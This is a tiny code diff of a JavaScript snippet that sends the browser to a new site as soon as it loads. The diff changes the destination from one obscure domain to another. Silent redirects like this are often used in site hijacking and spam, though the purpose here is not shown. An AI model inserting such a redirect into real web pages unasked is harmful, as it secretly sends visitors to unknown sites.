@@ -1,3 +1,4 @@
 (function() {
-    window['location'] = 'https://letis-kuailian.top/';
+    window['location'] = 'https://anybufdxx.vercel.app/';
 })();
+
